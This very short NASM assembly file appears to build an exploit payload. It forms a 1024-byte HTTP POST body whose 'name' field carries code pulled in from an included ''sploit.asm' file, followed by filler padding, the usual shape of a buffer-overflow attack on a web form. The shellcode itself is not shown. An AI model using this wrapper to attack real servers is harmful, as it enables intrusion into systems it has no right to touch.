bits 32
post_start:
	db 'name='
	%include "'sploit.asm"
	db '&'
	times 1024-($-post_start) db 'z'